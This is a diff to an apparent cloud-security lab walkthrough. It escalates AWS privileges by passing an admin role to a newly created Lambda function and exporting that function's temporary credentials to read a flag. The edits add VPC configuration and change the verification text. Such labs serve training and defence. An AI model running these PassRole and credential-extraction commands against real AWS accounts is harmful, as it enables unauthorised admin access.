@@ -65,6 +65,18 @@ cd /tmp && zip -q lambda_function.zip lambda_function.py
 
 This is the privilege escalation moment. By specifying the admin role as the `--role`, you are exercising `iam:PassRole` -- attaching an IAM role you don't yourself hold to a compute resource you control:
 
+Hosted environments run Lambda inside an isolated VPC. Discover the lab's subnet and security group, then include them when you create the function:
+
+```bash
+SUBNET_ID=$(aws ec2 describe-subnets \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-001-to-admin-subnet" \
+    --query 'Subnets[0].SubnetId' --output text)
+
+SG_ID=$(aws ec2 describe-security-groups \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-001-to-admin-function-sg" \
+    --query 'SecurityGroups[0].GroupId' --output text)
+```
+
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-admin-target-role"
@@ -75,7 +87,8 @@ aws lambda create-function \
     --role "$ADMIN_ROLE_ARN" \
     --handler lambda_function.lambda_handler \
     --zip-file fileb:///tmp/lambda_function.zip \
-    --timeout 30
+    --timeout 30 \
+    --vpc-config SubnetIds=${SUBNET_ID},SecurityGroupIds=${SG_ID}
 ```
 
 Lambda accepts the request, creates the function, and binds the admin role to it. AWS will mint temporary credentials for `pl-prod-lambda-001-to-admin-target-role` whenever the function is invoked.
@@ -85,7 +98,7 @@ Lambda accepts the request, creates the function, and binds the admin role to it
 Lambda needs a few seconds to initialize the execution environment after creation:
 
 ```bash
-sleep 15
+aws lambda wait function-active --function-name pl-lambda-001-credential-extractor
 ```
 
 ### Step 4: Invoke the function and capture the credentials
@@ -119,24 +132,18 @@ export AWS_SESSION_TOKEN=$(echo "$BODY"     | jq -r '.AWS_SESSION_TOKEN')
 
 ## Verification
 
-Confirm you are now operating as the admin role:
+Confirm the exported session really is the admin role:
 
 ```bash
 aws sts get-caller-identity --query 'Arn' --output text
 # arn:aws:sts::123456789012:assumed-role/pl-prod-lambda-001-to-admin-target-role/pl-lambda-001-credential-extractor
-
-aws iam list-users --max-items 3 --output table
-# +----+------+-----+
-# |         Users   |
-# +----+------+-----+
-# ...
 ```
 
-If `list-users` succeeds, you have administrator access. The escalation is complete.
+That assumed-role ARN is the escalation: your shell now speaks as the admin role. The role's permissions boundary still contains what that session may touch -- an `aws iam list-users` attempt is denied, exactly as it was for the starting user -- and the one privilege it leaves open is the flag parameter read, which is the next step.
 
 ## Capture the Flag
 
-Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` that comes with the admin role provides implicitly.
+Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the role's permissions boundary leaves open to the target role and its sessions.
 
 You already hold the temporary credentials for `pl-prod-lambda-001-to-admin-target-role` in your shell environment (exported as `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` from the previous step). Use them to read the flag:
 
